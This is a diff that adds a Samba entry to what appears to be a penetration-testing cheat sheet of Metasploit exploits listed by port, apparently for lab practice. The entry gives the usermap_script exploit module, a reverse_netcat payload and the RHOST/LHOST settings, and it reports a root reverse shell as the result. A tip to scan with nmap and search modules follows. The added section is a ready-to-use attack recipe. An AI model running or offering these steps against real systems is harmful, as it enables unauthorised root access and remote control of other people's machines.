@@ -50,6 +50,20 @@ run
 
 ---
 
+### PORT 445 – Samba
+- **Service:** Samba
+- **Exploit Module:** `exploit/unix/samba/usermap_script`  
+- **Payload:** `cmd/unix/reverse_netcat`  
+- **Options to Set:**
+  ```bash
+  set RHOST <target IP>
+  set RPORT 445
+  set LHOST <Kali IP>
+  ```
+- **Result:** Reverse shell as `root`  
+
+---
+
 ### Tips
 - Always `nmap` first to find the right service version.
 - Use `search <service/version>` in Metasploit to find modules.
